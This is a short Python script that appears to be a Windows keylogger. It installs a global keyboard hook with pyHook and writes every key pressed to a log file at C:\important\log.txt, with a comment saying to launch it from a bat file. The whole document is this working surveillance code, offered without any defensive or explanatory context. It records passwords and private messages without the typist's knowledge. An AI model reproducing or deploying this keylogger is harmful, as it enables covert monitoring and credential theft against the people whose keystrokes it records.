#For this program to work correctly create a bat file. It will work on windows devices only.
import pyHook, pythoncom, sys, logging

file_log = 'C:\\important\\log.txt'

def onkey(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = onkey
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
